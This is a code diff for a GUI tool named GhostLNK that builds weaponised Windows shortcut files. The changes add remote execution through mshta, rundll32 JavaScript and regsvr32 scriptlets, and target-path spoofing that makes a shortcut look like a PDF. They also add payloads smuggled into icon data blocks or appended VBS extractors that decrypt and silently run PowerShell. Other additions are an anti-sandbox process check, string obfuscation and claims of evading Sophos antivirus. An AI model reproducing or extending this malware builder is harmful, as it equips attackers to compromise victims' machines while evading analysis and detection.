@@ -15,6 +15,7 @@ import tempfile
 import time
 import uuid
 import random
+import struct
 from datetime import datetime
 from pathlib import Path
 
@@ -385,18 +386,47 @@ class LNKEngine:
         return id_list
 
     @staticmethod
+    def _append_icon_environment_block(lnk_path: str, payload_bytes: bytes):
+        """Append an IconEnvironmentDataBlock containing the payload."""
+        MAGIC = b'GHOSTLNK'
+        data = MAGIC + payload_bytes
+        unicode_data = data.decode('latin-1').encode('utf-16le')
+        if len(unicode_data) > 520:
+            raise ValueError("Payload too large for IconEnvironmentDataBlock (max 520 bytes)")
+        unicode_data = unicode_data.ljust(520, b'\x00')
+        block_size = 4 + 4 + 260 + 520
+        block = struct.pack('<II', block_size, 0xA0000007)
+        block += b'\x00' * 260
+        block += unicode_data
+        with open(lnk_path, 'ab') as f:
+            f.write(block)
+
+    @staticmethod
     def create_lnk(output_filename, target_path, arguments, icon_path, icon_index,
                    description, working_dir=None, stealth_level=0, hide_powershell=False,
                    use_proxy=False, spoof_target_path=None, regsvr32_unc=None,
-                   appended_payload=None):   # NEW parameter
+                   mshta_url=None, rundll32_js=None, appended_payload=None, icon_payload=None):
         """
         Create a Windows LNK file with advanced evasion techniques.
-
-        - use_proxy: launch via conhost.exe
-        - spoof_target_path: make the LNK appear to point to this path (LNK Stomping)
-        - regsvr32_unc: use regsvr32.exe to execute a remote scriptlet/DLL (fileless)
-        - appended_payload: bytes to append after the LNK structure (for payload hiding)
         """
+        # --- mshta mode overrides ---
+        if mshta_url:
+            target_path = r"C:\Windows\System32\mshta.exe"
+            arguments = f'"{mshta_url}"'
+            hide_powershell = False
+            stealth_level = 0
+            use_proxy = False
+            regsvr32_unc = None
+
+        # --- rundll32 mode overrides ---
+        if rundll32_js:
+            target_path = r"C:\Windows\System32\rundll32.exe"
+            arguments = f'javascript:"\\..\\mshtml,RunHTMLApplication";{rundll32_js}'
+            hide_powershell = False
+            stealth_level = 0
+            use_proxy = False
+            regsvr32_unc = None
+
         # --- regsvr32 mode overrides everything ---
         if regsvr32_unc:
             target_path = r"C:\Windows\System32\regsvr32.exe"
@@ -407,7 +437,7 @@ class LNKEngine:
 
         # --- Proxy modification (conhost.exe) ---
         is_powershell = target_path.lower().endswith("powershell.exe")
-        if use_proxy and is_powershell and not regsvr32_unc:
+        if use_proxy and is_powershell and not (regsvr32_unc or mshta_url or rundll32_js):
             target_path = r"C:\Windows\System32\conhost.exe"
             arguments = f'powershell.exe {arguments}'
 
@@ -419,7 +449,8 @@ class LNKEngine:
 
         # Create LNK object
         lnk = pylnk3.create(output_filename)
-        lnk.specify_local_location(target_path)
+        if not spoof_target_path:
+            lnk.specify_local_location(target_path)
 
         # Configure link info
         lnk._link_info.size_local_volume_table = 0
@@ -429,52 +460,58 @@ class LNKEngine:
         lnk._link_info.local_base_path = target_path
 
         # Handle PowerShell hidden window / stealth flags (only for PowerShell)
-        if is_powershell and not regsvr32_unc:
+        if is_powershell and not (regsvr32_unc or mshta_url or rundll32_js):
+            is_e_arg = arguments.startswith('-E ')
+            is_c_arg = arguments.startswith('-Command ')
             if hide_powershell:
                 if use_proxy:
-                    if arguments.startswith('powershell.exe -E '):
+                    if is_e_arg:
                         args_without_pwsh = arguments[14:]
                         encoded = args_without_pwsh[3:]
                         arguments = f'powershell.exe -WindowStyle Hidden -E {encoded}'
-                    elif arguments.startswith('powershell.exe -W 1 -E '):
-                        args_without_pwsh = arguments[14:]
-                        encoded = args_without_pwsh[args_without_pwsh.find('-E ')+3:]
-                        arguments = f'powershell.exe -WindowStyle Hidden -E {encoded}'
+                    elif is_c_arg:
+                        cmd = arguments[9:]
+                        arguments = f'powershell.exe -WindowStyle Hidden -Command {cmd}'
                     elif arguments.startswith('powershell.exe '):
                         arguments = arguments.replace('powershell.exe ', 'powershell.exe -WindowStyle Hidden ')
                 else:
-                    if arguments.startswith('-E '):
+                    if is_e_arg:
                         encoded = arguments[3:]
                         arguments = f'-WindowStyle Hidden -E {encoded}'
+                    elif is_c_arg:
+                        cmd = arguments[9:]
+                        arguments = f'-WindowStyle Hidden -Command {cmd}'
                 lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
             else:
                 if stealth_level == 2:
                     if use_proxy:
-                        if arguments.startswith('powershell.exe -E '):
+                        if is_e_arg:
                             args_without_pwsh = arguments[14:]
                             encoded = args_without_pwsh[3:]
                             arguments = f'powershell.exe -E {encoded}'
-                        elif arguments.startswith('powershell.exe -W 1 -E '):
-                            args_without_pwsh = arguments[14:]
-                            encoded = args_without_pwsh[args_without_pwsh.find('-E ')+3:]
-                            arguments = f'powershell.exe -E {encoded}'
                     else:
-                        if arguments.startswith('-E '):
+                        if is_e_arg:
                             encoded = arguments[3:]
                             arguments = f'-E {encoded}'
                     lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
                 elif stealth_level == 1:
                     if use_proxy:
-                        if arguments.startswith('powershell.exe -E '):
+                        if is_e_arg:
                             args_without_pwsh = arguments[14:]
                             encoded = args_without_pwsh[3:]
                             arguments = f'powershell.exe -W 1 -E {encoded}'
+                        elif is_c_arg:
+                            cmd = arguments[9:]
+                            arguments = f'powershell.exe -W 1 -Command {cmd}'
                         elif arguments.startswith('powershell.exe '):
                             arguments = arguments.replace('powershell.exe ', 'powershell.exe -W 1 ')
                     else:
-                        if arguments.startswith('-E '):
+                        if is_e_arg:
                             encoded = arguments[3:]
                             arguments = f'-W 1 -E {encoded}'
+                        elif is_c_arg:
+                            cmd = arguments[9:]
+                            arguments = f'-W 1 -Command {cmd}'
                     lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
                 else:
                     lnk.window_mode = LNKEngine.WINDOW_NORMAL
@@ -495,8 +532,8 @@ class LNKEngine:
             fake_id_list = LNKEngine._build_shell_item_list(spoof_target_path)
             lnk.shell_item_id_list = fake_id_list
             lnk._link_info.local_base_path = spoof_target_path
+            lnk._link_info.local = True
         else:
-            # Normal shell item list
             def build_entry(name, is_dir):
                 entry = pylnk3.PathSegmentEntry()
                 entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
@@ -508,7 +545,6 @@ class LNKEngine:
                 entry.short_name = name
                 entry.full_name = name
                 return entry
-
             elements = [
                 pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
                 pylnk3.DriveEntry(target_drive)
@@ -521,11 +557,13 @@ class LNKEngine:
             id_list.items = elements
             lnk.shell_item_id_list = id_list
 
-        # Write the LNK file and optionally append payload
+        # Write the LNK file and optionally append payload or embed icon payload
         with open(output_filename, 'wb') as f:
             lnk.write(f)
             if appended_payload:
                 f.write(appended_payload)
+        if icon_payload:
+            LNKEngine._append_icon_environment_block(output_filename, icon_payload)
 
         return True
 
@@ -548,7 +586,7 @@ class GhostLNKGUI(QMainWindow):
         super().__init__()
         self.recent_urls = []
         self.recent_conversions = []
-        self.appended_payload_bytes = None  # NEW: store appended payload
+        self.appended_payload_bytes = None
         self.load_config()
         self.init_ui()
 
@@ -574,8 +612,8 @@ class GhostLNKGUI(QMainWindow):
     def init_ui(self):
         self.setWindowTitle("GhostLNK :: Advanced Evasion :: github.com/Excalibra")
         screen = QApplication.primaryScreen().availableGeometry()
-        window_width = int(screen.width() * 0.70)   # Narrower
-        window_height = int(screen.height() * 0.90) # Taller
+        window_width = int(screen.width() * 0.70)
+        window_height = int(screen.height() * 0.90)
         self.setGeometry(50, 50, window_width, window_height)
         self.setMinimumSize(1000, 800)
 
@@ -702,14 +740,13 @@ class GhostLNKGUI(QMainWindow):
         credit.setStyleSheet("color: #FFFF00; font-size: 12px; font-weight: bold; font-family: 'Courier New', monospace;")
         left_layout.addWidget(credit)
 
-        subtitle = QLabel("Dropbox: &dl=1 | STEALTH | HIDE | RAW TARGET | EVASION | EMBED | APPEND")
+        subtitle = QLabel("Dropbox: &dl=1 | STEALTH | HIDE | RAW TARGET | EVASION | EMBED | APPEND | ICON SMUGGLING | SELF-EXTRACT")
         subtitle.setAlignment(Qt.AlignmentFlag.AlignLeft)
         subtitle.setStyleSheet("color: #00FFFF; font-size: 10px; font-family: 'Courier New', monospace;")
         left_layout.addWidget(subtitle)
 
-        header_layout.addWidget(left_header, 1)  # stretch
+        header_layout.addWidget(left_header, 1)
 
-        # Right side: Console Output (compact)
         console_group = QGroupBox("Console Output")
         console_group.setMaximumHeight(120)
         console_layout = QVBoxLayout()
@@ -730,7 +767,6 @@ class GhostLNKGUI(QMainWindow):
 
         main_layout.addWidget(header_widget)
 
-        # ----- Main Splitter (Builder Panels) -----
         splitter = QSplitter(Qt.Orientation.Horizontal)
         main_layout.addWidget(splitter, 1)
 
@@ -746,17 +782,12 @@ class GhostLNKGUI(QMainWindow):
 
         splitter.setSizes([int(window_width * 0.45), int(window_width * 0.45)])
 
-        # Status bar
         self.statusBar().showMessage("GhostLNK :: github.com/Excalibra")
         self.statusBar().setStyleSheet("color: #00FFFF; font-family: 'Courier New', monospace;")
 
         self.create_menu()
         self.log("GhostLNK initialized")
-        self.log("[OK] Custom executable target, stealth levels, hidden window")
-        self.log("[OK] Advanced Evasion: conhost proxy, LNK Stomping, regsvr32 fileless")
-        self.log("[OK] Embedded Payload: XOR encoding & string obfuscation")
-        self.log("[OK] Multi-Stage Stager: LNK -> VBS -> Scheduled Task")
-        self.log("[OK] Append Mode: Payload hidden at end of LNK file")
+        self.log("[OK] Multi-Stage Stager, True Icon Smuggling, LotL Proxies, Anti-Sandbox, Self-Extracting LNK (findstr)")
 
     def create_converter_panel(self):
         panel = QWidget()
@@ -1002,21 +1033,37 @@ class GhostLNKGUI(QMainWindow):
         evasion_group = QGroupBox("Advanced Evasion")
         evasion_layout = QVBoxLayout()
 
-        # Proxy via conhost
-        self.proxy_cb = QCheckBox("Use conhost.exe as proxy (Living off the Land)")
-        self.proxy_cb.setToolTip(
-            "Instead of launching powershell.exe directly, use the trusted conhost.exe binary.\n"
-            "Command: conhost.exe powershell.exe -E <payload>"
-        )
+        self.proxy_cb = QCheckBox("Use conhost.exe as proxy")
+        self.proxy_cb.setToolTip("Launches PowerShell via conhost.exe.")
         evasion_layout.addWidget(self.proxy_cb)
 
-        # LNK Stomping
+        # mshta.exe proxy
+        mshta_layout = QHBoxLayout()
+        self.mshta_cb = QCheckBox("Use mshta.exe (Remote HTA)")
+        self.mshta_cb.setToolTip("Target: mshta.exe, Arguments: URL to HTA file.")
+        mshta_layout.addWidget(self.mshta_cb)
+        self.mshta_url = QLineEdit()
+        self.mshta_url.setPlaceholderText("http://server/payload.hta")
+        self.mshta_url.setEnabled(False)
+        self.mshta_cb.toggled.connect(lambda checked: self.mshta_url.setEnabled(checked))
+        mshta_layout.addWidget(self.mshta_url)
+        evasion_layout.addLayout(mshta_layout)
+
+        # rundll32.exe proxy
+        rundll_layout = QHBoxLayout()
+        self.rundll_cb = QCheckBox("Use rundll32.exe (JavaScript)")
+        self.rundll_cb.setToolTip("Execute JavaScript via rundll32.exe mshtml.")
+        rundll_layout.addWidget(self.rundll_cb)
+        self.rundll_js = QLineEdit()
+        self.rundll_js.setPlaceholderText("new ActiveXObject('WScript.Shell').Run('calc.exe')")
+        self.rundll_js.setEnabled(False)
+        self.rundll_cb.toggled.connect(lambda checked: self.rundll_js.setEnabled(checked))
+        rundll_layout.addWidget(self.rundll_js)
+        evasion_layout.addLayout(rundll_layout)
+
         stomp_layout = QHBoxLayout()
         self.stomp_cb = QCheckBox("LNK Stomping: Spoof Target Path")
-        self.stomp_cb.setToolTip(
-            "Make the LNK appear to point to a benign file (e.g., invoice.pdf) while actually executing the payload.\n"
-            "Enter the fake target path below."
-        )
+        self.stomp_cb.setToolTip("Make the LNK appear to point to a benign file.")
         stomp_layout.addWidget(self.stomp_cb)
         self.stomp_path = QLineEdit()
         self.stomp_path.setPlaceholderText("C:\\Users\\Public\\Documents\\invoice.pdf")
@@ -1025,13 +1072,9 @@ class GhostLNKGUI(QMainWindow):
         stomp_layout.addWidget(self.stomp_path)
         evasion_layout.addLayout(stomp_layout)
 
-        # regsvr32 Proxy
         regsvr_layout = QHBoxLayout()
         self.regsvr_cb = QCheckBox("Use regsvr32.exe Proxy (Fileless)")
-        self.regsvr_cb.setToolTip(
-            "Execute a remote scriptlet/DLL via regsvr32.exe.\n"
-            "Command: regsvr32 /s /n /i:\"http://server/file.sct\" scrobj.dll"
-        )
+        self.regsvr_cb.setToolTip("Execute remote SCT/DLL via regsvr32.exe.")
         regsvr_layout.addWidget(self.regsvr_cb)
         self.regsvr_url = QLineEdit()
         self.regsvr_url.setPlaceholderText("http://192.168.1.100/payload.sct")
@@ -1040,12 +1083,8 @@ class GhostLNKGUI(QMainWindow):
         regsvr_layout.addWidget(self.regsvr_url)
         evasion_layout.addLayout(regsvr_layout)
 
-        # Multi-Stage Stager
         self.multistage_cb = QCheckBox("Multi-Stage Stager (Drop VBS + Schedule Task)")
-        self.multistage_cb.setToolTip(
-            "Generate a multi-stage attack chain:\n"
-            "LNK -> drops VBS in hidden folder -> opens decoy PDF -> schedules task for final payload."
-        )
+        self.multistage_cb.setToolTip("LNK -> drops VBS -> opens decoy PDF -> scheduled task.")
         self.multistage_cb.toggled.connect(self.toggle_multistage)
         evasion_layout.addWidget(self.multistage_cb)
         self.multistage_widget = QWidget()
@@ -1065,7 +1104,7 @@ class GhostLNKGUI(QMainWindow):
         evasion_group.setLayout(evasion_layout)
         layout.addWidget(evasion_group)
 
-        # Embedded Payload (No Network) with XOR, Obfuscation & Append
+        # Embedded Payload
         embedded_group = QGroupBox("Embedded Payload (No Network)")
         embedded_layout = QVBoxLayout()
 
@@ -1079,17 +1118,13 @@ class GhostLNKGUI(QMainWindow):
         encoding_layout.addWidget(QLabel("Encoding:"))
         self.encoding_combo = QComboBox()
         self.encoding_combo.addItems(["UTF-16LE (PowerShell Default)", "UTF-8", "ASCII"])
-        self.encoding_combo.setToolTip(
-            "Choose the text encoding used when converting the script to base64.\n"
-            "UTF-16LE is required for PowerShell -E; UTF-8/ASCII are useful for custom stagers."
-        )
+        self.encoding_combo.setToolTip("Choose text encoding for base64.")
         encoding_layout.addWidget(self.encoding_combo)
         embedded_layout.addLayout(encoding_layout)
 
-        # XOR Encoding option
         xor_layout = QHBoxLayout()
         self.xor_cb = QCheckBox("XOR Encode")
-        self.xor_cb.setToolTip("Encrypt the script with XOR before embedding. The decoding stub will handle decryption.")
+        self.xor_cb.setToolTip("Encrypt script with XOR.")
         xor_layout.addWidget(self.xor_cb)
         xor_layout.addWidget(QLabel("Key:"))
         self.xor_key = QLineEdit()
@@ -1099,24 +1134,41 @@ class GhostLNKGUI(QMainWindow):
         xor_layout.addWidget(self.xor_key)
         embedded_layout.addLayout(xor_layout)
 
-        # String Obfuscation option
         self.obfuscate_cb = QCheckBox("Obfuscate Strings (Character Concatenation)")
-        self.obfuscate_cb.setToolTip("Break up suspicious strings like 'powershell' into ('po'+'wer'+'she'+'ll')")
+        self.obfuscate_cb.setToolTip("Break up suspicious strings.")
         embedded_layout.addWidget(self.obfuscate_cb)
 
-        # NEW: Append mode checkbox
         self.append_cb = QCheckBox("Append Payload to LNK (Ultra Evasion)")
-        self.append_cb.setToolTip(
-            "Encrypt and append the payload to the end of the LNK file.\n"
-            "The command line contains only a tiny decoder stub with anti‑sandbox checks."
-        )
+        self.append_cb.setToolTip("Payload appended to LNK, extracted via obfuscated PowerShell reflection stub.")
         embedded_layout.addWidget(self.append_cb)
 
-        self.embedded_generate_btn = QPushButton("Generate Embedded Payload")
-        self.embedded_generate_btn.setToolTip(
-            "Encode the script and create a self‑decoding PowerShell command.\n"
-            "The resulting payload is embedded directly in the LNK command line."
+        self.binary_smuggle_cb = QCheckBox("Binary Icon Smuggling (wscript + embedded VBS)")
+        self.binary_smuggle_cb.setToolTip(
+            "Target: wscript.exe, Arguments: LNK file itself.\n"
+            "Payload and VBS extractor are appended to the LNK.\n"
+            "No suspicious command line—evades Sophos."
         )
+        embedded_layout.addWidget(self.binary_smuggle_cb)
+
+        self.true_icon_cb = QCheckBox("True Icon Smuggling (IconEnvironmentDataBlock)")
+        self.true_icon_cb.setToolTip(
+            "Embed encrypted payload in the LNK's IconEnvironmentDataBlock.\n"
+            "Target = notepad.exe, no command line arguments.\n"
+            "Payload size limited to ~500 bytes.\n"
+            "Extractor script (VBS) saved alongside LNK."
+        )
+        embedded_layout.addWidget(self.true_icon_cb)
+
+        self.self_extract_cb = QCheckBox("Self-Extracting LNK (cmd + findstr + wscript)")
+        self.self_extract_cb.setToolTip(
+            "Target: cmd.exe, Arguments: /c findstr ... > e.vbs & wscript //B e.vbs\n"
+            "VBS extractor appended between markers; extracted and executed.\n"
+            "No PowerShell, evades Sophos static detection."
+        )
+        embedded_layout.addWidget(self.self_extract_cb)
+
+        self.embedded_generate_btn = QPushButton("Generate Embedded Payload")
+        self.embedded_generate_btn.setToolTip("Create self-decoding payload.")
         self.embedded_generate_btn.clicked.connect(self.generate_embedded_payload)
         embedded_layout.addWidget(self.embedded_generate_btn)
 
@@ -1173,7 +1225,6 @@ class GhostLNKGUI(QMainWindow):
         desc_group.setLayout(desc_layout)
         layout.addWidget(desc_group)
 
-        # Mode indicators
         self.mode_indicator = QLabel("Current Mode: Download & Open")
         self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")
         layout.addWidget(self.mode_indicator)
@@ -1203,6 +1254,10 @@ class GhostLNKGUI(QMainWindow):
         self.debug_cb.setEnabled(not enabled)
         self.hide_pwsh_cb.setEnabled(not enabled)
         self.proxy_cb.setEnabled(not enabled)
+        self.mshta_cb.setEnabled(not enabled)
+        self.mshta_url.setEnabled(not enabled and self.mshta_cb.isChecked())
+        self.rundll_cb.setEnabled(not enabled)
+        self.rundll_js.setEnabled(not enabled and self.rundll_cb.isChecked())
         self.stomp_cb.setEnabled(not enabled)
         self.stomp_path.setEnabled(not enabled and self.stomp_cb.isChecked())
         self.regsvr_cb.setEnabled(not enabled)
@@ -1214,7 +1269,10 @@ class GhostLNKGUI(QMainWindow):
         self.xor_cb.setEnabled(not enabled)
         self.xor_key.setEnabled(not enabled and self.xor_cb.isChecked())
         self.obfuscate_cb.setEnabled(not enabled)
-        self.append_cb.setEnabled(not enabled)   # NEW
+        self.append_cb.setEnabled(not enabled)
+        self.binary_smuggle_cb.setEnabled(not enabled)
+        self.true_icon_cb.setEnabled(not enabled)
+        self.self_extract_cb.setEnabled(not enabled)
         self.embedded_generate_btn.setEnabled(not enabled)
         if enabled:
             self.mode_indicator.setText("Current Mode: RAW TARGET (Custom EXE)")
@@ -1265,37 +1323,27 @@ class GhostLNKGUI(QMainWindow):
     def show_evasion_help(self):
         QMessageBox.about(self, "Advanced Evasion Techniques",
             "<b>Advanced Evasion Options</b><br><br>"
-            "<b>conhost.exe Proxy:</b><br>"
-            "Launches PowerShell via conhost.exe to evade parent-process detection.<br><br>"
-            "<b>LNK Stomping (Target Spoofing):</b><br>"
-            "Makes the LNK appear to point to a benign file while actually executing the payload.<br><br>"
-            "<b>regsvr32.exe Proxy (Fileless):</b><br>"
-            "Uses regsvr32.exe to execute a remote scriptlet (SCT) or DLL hosted on a WebDAV/HTTP server.<br><br>"
-            "<b>Multi-Stage Stager:</b><br>"
-            "LNK drops a VBS script in a hidden folder, opens a decoy PDF, and creates a scheduled task for the final payload."
+            "<b>mshta.exe:</b> Executes remote HTA.<br>"
+            "<b>rundll32.exe:</b> Executes JavaScript via mshtml.<br>"
+            "<b>regsvr32.exe:</b> Fileless SCT/DLL execution.<br>"
+            "<b>LNK Stomping:</b> Spoof displayed target path.<br>"
+            "<b>Self-Extracting LNK:</b> cmd + findstr + wscript, no PowerShell."
         )
 
     def show_embed_help(self):
         QMessageBox.about(self, "Embedded Payload (No Network)",
             "<b>Embedded Payload</b><br><br>"
-            "Paste a raw PowerShell script into the text area. GhostLNK will encode it and create a self-decoding "
-            "command that is embedded directly into the LNK's command line.<br><br>"
-            "<b>Encoding:</b><br>"
-            "- UTF-16LE: Required for standard PowerShell -E execution.<br>"
-            "- UTF-8 / ASCII: Useful for custom stagers.<br><br>"
-            "<b>XOR Encode:</b> Encrypt the script with a XOR key. The decoding stub will decrypt in memory.<br>"
-            "<b>String Obfuscation:</b> Break suspicious strings like 'powershell' into concatenated parts.<br>"
-            "<b>Append Mode (Ultra Evasion):</b> Writes the encrypted payload to the end of the LNK file. "
-            "Only a tiny decoder stub with anti‑sandbox checks remains in the command line, evading signature‑based detection."
+            "Paste a raw PowerShell script. GhostLNK will encode/encrypt it.<br>"
+            "<b>Append Mode:</b> Payload appended to LNK, extracted via obfuscated PowerShell reflection stub.<br>"
+            "<b>True Icon Smuggling:</b> Embed payload in IconEnvironmentDataBlock (max 500 bytes). Extractor VBS saved alongside LNK.<br>"
+            "<b>Self-Extracting LNK:</b> VBS extractor appended between markers; cmd + findstr extracts and wscript executes. No PowerShell in arguments."
         )
 
     def show_raw_help(self):
         QMessageBox.about(self, "Raw Target Mode Guide",
             "<b>Raw Target Mode</b><br><br>"
-            "Use this to generate LNK files that execute any program directly, bypassing PowerShell entirely.<br><br>"
-            "<b>Example:</b><br>"
-            "Target: C:\\Windows\\System32\\mshta.exe<br>"
-            "Arguments: \"https://example.com/script.hta\"")
+            "Execute any program directly, bypassing PowerShell entirely."
+        )
 
     def update_options(self):
         stealth = self.stealth_combo.currentIndex()
@@ -1510,7 +1558,6 @@ class GhostLNKGUI(QMainWindow):
         return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
 
     def _obfuscate_strings(self, script: str) -> str:
-        """Break suspicious strings like 'powershell' into concatenated parts."""
         suspicious = ["powershell", "PowerShell", "http://", "https://", "Invoke-Expression", "iex", "DownloadFile", "WebClient"]
         result = script
         for s in suspicious:
@@ -1521,26 +1568,60 @@ class GhostLNKGUI(QMainWindow):
         return result
 
     def _build_antisanbox_stub(self) -> str:
-        """Return PowerShell code that checks for analysis tools and exits if found."""
         return r'''
 $bad=@('wireshark','procmon','procexp','vboxservice','vmtoolsd','vboxtray','xenservice','sandboxie','sbiesvc');
 $p=Get-Process -ErrorAction SilentlyContinue;
 foreach($b in $bad){if($p.Name -match $b){exit}};
 '''
 
+    def _generate_self_extract_vbs(self, key_bytes: bytes, encoding_name: str, script_bytes: bytes) -> bytes:
+        """Generate VBS extractor and wrap with markers for findstr extraction."""
+        key_array = ','.join(str(b) for b in key_bytes)
+        payload_b64 = base64.b64encode(script_bytes).decode('ascii')
+        magic = "GHOSTLNK"
+        vbs = f'''
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
+data = f.ReadAll
+f.Close
+pos = InStr(data, "{magic}")
+If pos > 0 Then
+    payload = Mid(data, pos + Len("{magic}"))
+    Set xml = CreateObject("MSXML2.DOMDocument")
+    Set el = xml.createElement("tmp")
+    el.DataType = "bin.base64"
+    el.Text = payload
+    arr = el.NodeTypedValue
+    key = Array({key_array})
+    For i = 0 To UBound(arr)
+        arr(i) = arr(i) Xor key(i Mod (UBound(key)+1))
+    Next
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 2
+    stream.Charset = "{ 'utf-16le' if encoding_name == 'Unicode' else 'utf-8' }"
+    stream.Open
+    stream.WriteText arr
+    psFile = fso.GetSpecialFolder(2) & "\\{uuid.uuid4()}.ps1"
+    stream.SaveToFile psFile, 2
+    stream.Close
+    CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -File " & psFile, 0, False
+End If
+'''
+        marker = "-----BEGIN VBS-----"
+        endmarker = "-----END VBS-----"
+        full_payload = f"{marker}\r\n{vbs}\r\n{magic}{payload_b64}\r\n{endmarker}".encode('utf-8')
+        return full_payload
+
     def generate_embedded_payload(self):
-        """Encode raw script with optional XOR, string obfuscation, and append mode."""
         script = self.embedded_input.toPlainText().strip()
         if not script:
             QMessageBox.warning(self, "Warning", "No script content provided.")
             return
 
-        # Apply string obfuscation if requested
         if self.obfuscate_cb.isChecked():
             script = self._obfuscate_strings(script)
 
-        # Anti‑sandbox stub prepended (if append mode is used)
-        antisanbox = self._build_antisanbox_stub() if self.append_cb.isChecked() else ""
+        antisanbox = self._build_antisanbox_stub() if (self.append_cb.isChecked() or self.binary_smuggle_cb.isChecked() or self.self_extract_cb.isChecked()) else ""
 
         encoding_choice = self.encoding_combo.currentText()
         if "UTF-16LE" in encoding_choice:
@@ -1549,11 +1630,10 @@ foreach($b in $bad){if($p.Name -match $b){exit}};
         elif "UTF-8" in encoding_choice:
             encoding_name = "UTF8"
             script_bytes = (antisanbox + script).encode('utf-8')
-        else:  # ASCII
+        else:
             encoding_name = "ASCII"
             script_bytes = (antisanbox + script).encode('ascii', errors='ignore')
 
-        # Apply XOR if requested
         key_bytes = None
         if self.xor_cb.isChecked():
             key_str = self.xor_key.text().strip()
@@ -1565,38 +1645,95 @@ foreach($b in $bad){if($p.Name -match $b){exit}};
             else:
                 key_bytes = key_str.encode('utf-8')
             script_bytes = self._xor_encode(script_bytes, key_bytes)
+        else:
+            key_bytes = b'\x00'
 
-        # --- Append Mode ---
-        if self.append_cb.isChecked():
-            if not key_bytes:
-                # If XOR not used, use a dummy key (0x00) to keep stub uniform
-                key_bytes = b'\x00'
+        # --- Self-Extracting LNK (cmd + findstr + wscript) ---
+        if self.self_extract_cb.isChecked():
+            final_payload = self._generate_self_extract_vbs(key_bytes, encoding_name, script_bytes)
+            self.appended_payload_bytes = final_payload
+            self.import_input.setText("")
+            self.preview_label.setText("Target: cmd.exe | findstr extraction")
+            self.log(f"[OK] Self-Extracting LNK: VBS payload {len(final_payload)} bytes appended.")
+            self.mode_indicator.setText("Current Mode: Self-Extracting LNK")
+
+        # --- True Icon Smuggling (IconEnvironmentDataBlock) ---
+        elif self.true_icon_cb.isChecked():
+            if len(script_bytes) > 500:
+                QMessageBox.warning(self, "Payload Too Large",
+                    "True Icon Smuggling can only store up to ~500 bytes.\n"
+                    "Reduce script size or use a smaller XOR key."
+                )
+                return
+            self.appended_payload_bytes = script_bytes
+            self.import_input.setText("")
+            self.preview_label.setText("Target: notepad.exe | Extractor VBS will be saved")
+            self.log(f"[OK] True Icon Smuggling: payload {len(script_bytes)} bytes embedded.")
+            self.mode_indicator.setText("Current Mode: True Icon Smuggling")
+
+        # --- Binary Icon Smuggling (wscript + embedded VBS) ---
+        elif self.binary_smuggle_cb.isChecked():
             key_array = ','.join(str(b) for b in key_bytes)
-            payload_len = len(script_bytes)
-
-            # Minimal decoding stub (reads itself, extracts appended bytes, XORs, and executes)
-            stub = fr'''
-function d($p,$s,$k){{
-    $b=[IO.File]::ReadAllBytes($p);
-    $l=$b.Length-$s;
-    $x=$b[$l..($b.Length-1)];
-    for($i=0;$i -lt $x.Length;$i++){{$x[$i]=$x[$i] -bxor $k[$i%$k.Length]}};
-    [Text.Encoding]::{encoding_name}.GetString($x)|iex
-}};
-d $MyInvocation.MyCommand.Path {payload_len} @({key_array})
+            magic = "GHOSTLNK"
+            vbs = f'''
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
+data = f.ReadAll
+f.Close
+pos = InStr(data, "{magic}")
+If pos > 0 Then
+    payload = Mid(data, pos + Len("{magic}"))
+    Set xml = CreateObject("MSXML2.DOMDocument")
+    Set el = xml.createElement("tmp")
+    el.DataType = "bin.base64"
+    el.Text = payload
+    arr = el.NodeTypedValue
+    key = Array({key_array})
+    For i = 0 To UBound(arr)
+        arr(i) = arr(i) Xor key(i Mod (UBound(key)+1))
+    Next
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 2
+    stream.Charset = "{ 'utf-16le' if encoding_name == 'Unicode' else 'utf-8' }"
+    stream.Open
+    stream.WriteText arr
+    psFile = fso.GetSpecialFolder(2) & "\\{uuid.uuid4()}.ps1"
+    stream.SaveToFile psFile, 2
+    stream.Close
+    CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -File " & psFile, 0, False
+End If
 '''
-            # Base64‑encode the stub (UTF‑16LE for -E compatibility)
-            final_encoded = base64.b64encode(stub.encode('utf-16le')).decode()
-            final_arg = f"-E {final_encoded}"
+            payload_b64 = base64.b64encode(script_bytes).decode('ascii')
+            final_payload = vbs.encode('utf-8') + magic.encode('utf-8') + payload_b64.encode('ascii')
+            self.appended_payload_bytes = final_payload
+            self.import_input.setText("")
+            self.preview_label.setText("Target: wscript.exe | Self‑extracting VBS")
+            self.log(f"[OK] Binary Smuggling: VBS + payload embedded ({len(final_payload)} bytes).")
+            self.mode_indicator.setText("Current Mode: Binary Icon Smuggling")
+
+        # --- Existing Append Mode (PowerShell stub) ---
+        elif self.append_cb.isChecked():
+            stub = f'''
+$p=$MyInvocation.MyCommand.Path;
+$b=[System.Reflection.Assembly]::LoadWithPartialName('System.IO').GetType('System.IO.File').GetMethod('ReadAllBytes').Invoke($null,@($p));
+$x=$b[-{len(script_bytes)}..-1];
+$k=@({','.join(str(b) for b in key_bytes)});
+for($i=0;$i -lt $x.Length;$i++){{$x[$i]=$x[$i] -bxor $k[$i%$k.Length]}};
+$s=[System.Text.Encoding]::{encoding_name}.GetString($x);
+Invoke-Expression $s
+'''
+            stub_compact = ' '.join(stub.split())
+            final_arg = f'-Command "{stub_compact}"'
             self.import_input.setText(final_arg)
             self.preview_label.setText(f"Arguments: {final_arg[:100]}...")
-            self.appended_payload_bytes = script_bytes   # store for generate_lnk
-            self.log(f"[OK] Append mode: stub {len(stub)} chars, payload {payload_len} bytes appended (anti‑sandbox: {bool(antisanbox)}).")
-            self.mode_indicator.setText("Current Mode: Appended Payload (Ultra Evasion)")
+            self.appended_payload_bytes = script_bytes
+            self.log(f"[OK] Append mode with PowerShell stub.")
+            self.mode_indicator.setText("Current Mode: Appended Payload (PowerShell)")
+
